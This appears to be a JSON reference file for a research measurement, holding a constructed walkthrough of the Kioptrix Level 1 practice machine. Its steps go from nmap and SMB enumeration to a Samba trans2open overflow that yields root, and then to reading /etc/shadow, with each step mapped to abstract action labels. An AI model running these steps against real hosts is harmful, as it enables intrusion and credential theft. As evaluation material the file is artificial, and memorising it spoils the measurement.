@@ -1,0 +1,83 @@
+{
+  "box": "Kioptrix-L1",
+  "source": "Representative walkthrough constructed from public Kioptrix Level 1 write-up structure (Samba trans2open remote overflow -> direct root). Author-constructed for offline Phase-1 mapping measurement; NOT a live capture. Included deliberately as a largely NON-web box to test whether the adapter correctly FLAGS the out-of-abstraction primitive instead of hallucinating a web action.",
+  "abstract_family": "rce_privesc",
+  "vulnhub_correspondence": "An old single host exposing Apache 1.3.20 / mod_ssl and Samba 2.2.1a; the canonical foothold is a remote buffer overflow against the SMB/Samba service (trans2open, CVE-2003-0201) which yields a direct root shell.",
+  "target_label": "http://10.10.10.5",
+  "steps": [
+    {
+      "step": 0,
+      "phase": "recon",
+      "actor_intent": "Scan all ports and service versions with nmap.",
+      "tool": "nmap",
+      "tool_command": "nmap -sV -p- 10.10.10.5",
+      "tool_output": "PORT     STATE SERVICE     VERSION\n22/tcp   open  ssh         OpenSSH 2.9p2\n80/tcp   open  http        Apache httpd 1.3.20 (mod_ssl/2.8.4 OpenSSL/0.9.6b)\n139/tcp  open  netbios-ssn Samba smbd\n443/tcp  open  ssl/http    Apache httpd 1.3.20\n32768/tcp open status",
+      "reference_abstract_action": "service_enumeration",
+      "reference_state_after": {"open_services": ["http:80", "https:443"], "tech_stack": ["apache", "openssl"]}
+    },
+    {
+      "step": 1,
+      "phase": "enumeration",
+      "actor_intent": "Fingerprint the web server to record its version.",
+      "tool": "whatweb",
+      "tool_command": "whatweb http://10.10.10.5/",
+      "tool_output": "http://10.10.10.5/ [200 OK] Apache[1.3.20], HTTPServer[Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b], OpenSSL[0.9.6b]",
+      "reference_abstract_action": "http_fingerprint",
+      "reference_state_after": {"tech_stack": ["apache", "openssl"]}
+    },
+    {
+      "step": 2,
+      "phase": "enumeration",
+      "actor_intent": "Enumerate the SMB/Samba service to recover its exact version.",
+      "tool": "nmap",
+      "tool_command": "nmap --script smb-os-discovery -p139 10.10.10.5",
+      "tool_output": "139/tcp open  netbios-ssn\n| smb-os-discovery:\n|   Samba 2.2.1a\n|_  OS: Unix",
+      "reference_abstract_action": "service_enumeration",
+      "reference_state_after": {}
+    },
+    {
+      "step": 3,
+      "phase": "vuln-id",
+      "actor_intent": "Search for known exploits matching Samba 2.2.1a.",
+      "tool": "searchsploit",
+      "tool_command": "searchsploit samba 2.2",
+      "tool_output": "Samba < 2.2.8 (Linux/BSD) - 'trans2open' Remote Overflow (CVE-2003-0201)  | linux/remote/10.c\nSamba 2.2.x - Remote Code Execution",
+      "reference_abstract_action": "vulnerability_check",
+      "vuln_id": "samba_trans2open",
+      "reference_state_after": {}
+    },
+    {
+      "step": 4,
+      "phase": "exploit",
+      "actor_intent": "Run the Samba trans2open remote buffer overflow to get a shell.",
+      "tool": "exploit",
+      "tool_command": "./trans2open 10.10.10.5",
+      "tool_output": "[+] Connecting to 10.10.10.5:139\n[+] trans2open overflow sent, return address aligned\n[+] root shell spawned\n# id\nuid=0(root) gid=0(root)",
+      "reference_abstract_action": "out_of_abstraction",
+      "out_of_abstraction_reason": "A remote memory-corruption (stack buffer overflow) exploit against the SMB/Samba network service is a non-web binary exploitation primitive; the schema's exploit_attempt is scoped to web vulnerabilities (injection, RCE via HTTP, upload) and cannot represent it.",
+      "suggested_schema_extension": "binary_service_exploit",
+      "reference_state_after": {}
+    },
+    {
+      "step": 5,
+      "phase": "post-exploit",
+      "actor_intent": "Confirm the obtained shell is running as root.",
+      "tool": "command",
+      "tool_command": "id; whoami",
+      "tool_output": "uid=0(root) gid=0(root)\nroot",
+      "reference_abstract_action": "command_execution",
+      "reference_state_after": {"shell_state": "command_execution", "privilege_level": "root"}
+    },
+    {
+      "step": 6,
+      "phase": "loot",
+      "actor_intent": "Read the shadow file to prove full compromise.",
+      "tool": "fileread",
+      "tool_command": "cat /etc/shadow",
+      "tool_output": "root:$1$saltsalt$abcdefghijklmnopqrstuv0:12772:0:99999:7:::\nbin:*:12772:0:99999:7:::",
+      "reference_abstract_action": "sensitive_file_read",
+      "file_id": "etc_shadow",
+      "reference_state_after": {"read_files": ["etc_shadow"]}
+    }
+  ]
+}
